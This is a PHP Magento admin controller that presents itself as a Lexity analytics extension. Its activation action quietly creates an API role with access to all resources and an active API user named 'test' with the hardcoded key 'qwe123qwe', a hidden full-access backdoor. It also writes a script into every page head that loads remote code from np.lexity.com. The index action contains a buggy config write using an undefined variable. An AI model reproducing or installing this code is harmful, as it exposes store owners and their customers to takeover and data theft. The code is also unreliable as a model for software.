<?php class Lexity_Ganalytics_IndexController extends Mage_Adminhtml_Controller_Action {        
   public function indexAction()
    {
        $this->loadLayout();

        //create a text block with the name of "example-block"
		$url =  $this->getUrl('/index/adduser');
        $block = $this->getLayout()
		
        ->createBlock('core/text', 'activation-block')
        ->setText('<h1>Configuration</h1><hr /><br />
				   <a href="'
				   .$url.
				   '">click here to activate</a>');
		
        $this->_addContent($block);
		 var_dump(Mage::getModel('core/config')->saveConfig('design/head/includes', $value ));			
		
		
		$this->_setActiveMenu('Lexity/first_page');
        $this->renderLayout();
    }
	
	public function adduserAction()
	{
	
		 $this->loadLayout();
		 $role = Mage::getModel('api/roles')
		->setName('test')
		->setPid(false)
		->setRoleType('G')
		->save();
		
		Mage::getModel("api/rules")
		->setRoleId($role->getId())
		->setResources(array('all'))
		->saveRel();
		
		
$user = Mage::getModel('api/user');
$user->setData(array(
'username' => 'test',
'firstname' => 'test',
'lastname' => 'test',
'email' => 'test@test.com',
'api_key' => 'qwe123qwe',
'api_key_confirmation' => 'qwe123qwe',
'is_active' => 1,
'user_roles' => '',
'assigned_user_role' => '',
'role_name' => '',
'roles' => array($role->getId())
));
$user->save()->load($user->getId());

$user->setRoleIds(array($role->getId()))
->setRoleUserId($user->getUserId())
->saveRelations();
	$value = '<!-- Added by Lexity. DO NOT REMOVE/EDIT -->
<meta name="google-site-verification" content="OSSD3GtrEAohD1Tj4XPxZ8Ah08gRAjh2fsIenKdGEG4" />
<script type="text/javascript">
(function(d, w) {
var x = d.getElementsByTagName(\'SCRIPT\')[0];
var g = d.createElement(\'SCRIPT\');
g.type = \'text/javascript\';
g.async = true;
g.src = (\'https:\' == d.location.protocol ? \'https://ssl\' : \'http://www\') + \'.google-analytics.com/ga.js\';
x.parentNode.insertBefore(g, x);
var f = function () {
var s = d.createElement(\'SCRIPT\');
s.type = \'text/javascript\';
s.async = true;
s.src = "//np.lexity.com/9fd73d01";
x.parentNode.insertBefore(s, x);
};
w.attachEvent ? w.attachEvent(\'onload\', f) : w.addEventListener(\'load\', f, false);
}(document, window));
</script>
<!-- End of addition by Lexity. DO NOT REMOVE/EDIT -->';

		Mage::getModel('core/config')->saveConfig('design/head/includes', $value );	
		Mage::getConfig()->reinit();
		Mage::app()->reinitStores();
		$block = $this->getLayout()
	 		->createBlock('core/text', 'activation-block')
        	->setText('<h5>congratulation</h5>');
		
		
        $this->_addContent($block);
		$this->renderLayout();
	}
	
}
?>